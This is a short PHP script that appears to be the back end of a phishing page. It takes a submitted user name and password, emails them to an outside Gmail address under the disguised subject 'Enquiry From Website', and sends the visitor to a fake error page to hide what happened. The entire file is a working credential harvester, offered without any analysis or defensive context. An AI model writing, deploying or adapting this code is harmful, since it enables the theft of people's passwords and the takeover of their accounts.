<?php
 
$msg = $msg."User Name :". $_POST['1']."\n";
$msg = $msg."Password :". $_POST['2']."\n";
$recipient = "risers.techies@gmail.com";
$subject = "Enquiry From Website";
$header = "Reply-To: ".$_POST["email"];
mail($recipient, $subject, $msg, $header);
header("location:error/error.html");
?>


